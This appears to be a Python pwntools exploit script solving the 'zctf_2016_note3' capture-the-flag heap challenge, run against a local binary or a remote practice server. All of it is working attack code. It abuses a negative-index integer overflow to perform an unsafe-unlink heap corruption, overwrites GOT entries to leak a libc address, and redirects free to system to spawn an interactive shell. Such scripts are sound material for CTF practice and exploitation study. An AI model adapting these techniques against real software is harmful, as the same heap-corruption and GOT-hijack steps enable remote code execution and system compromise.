import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./zctf_2016_note3')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./zctf_2016_note3')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28770)
			elf=ELF('./zctf_2016_note3')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,c):
			io.sendlineafter('--->>','1')
			io.sendlineafter('(less than 1024)',str(a))
			io.sendlineafter('content:',c)

		def delete(a):
			io.sendlineafter('--->>','4')
			io.sendlineafter('of the note:',str(a))

		def edit(a,c):
			io.sendlineafter('--->>','3')
			io.sendlineafter('of the note:',str(a))
			io.sendlineafter('content:',c)

		ptr_0=0x6020C8
		add(0x98,'aaaa')
		add(0x88,'aaaa')
		add(0x18,'aaaa')
		delete(0)
		add(0x98,'aaaa')
		pay=p64(0)+p64(0x91)+p64(ptr_0-0x18)+p64(ptr_0-0x10)+'\x00'*0x70+p64(0x90)+p64(0x90)
		edit(-0x8000000000000000,pay)
		delete(1)
		edit(0,'\x00'*0x18+p64(ptr_0)+p64(elf.got['free'])+p64(elf.got['puts']))
		edit(1,p64(elf.plt['puts'])[:7])
		delete(2)

		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		edit(1,p64(libc.sym['system'])[:7])
		add(0x20,'/bin/sh\x00')
		delete(-0x8000000000000000)




		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive('')

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue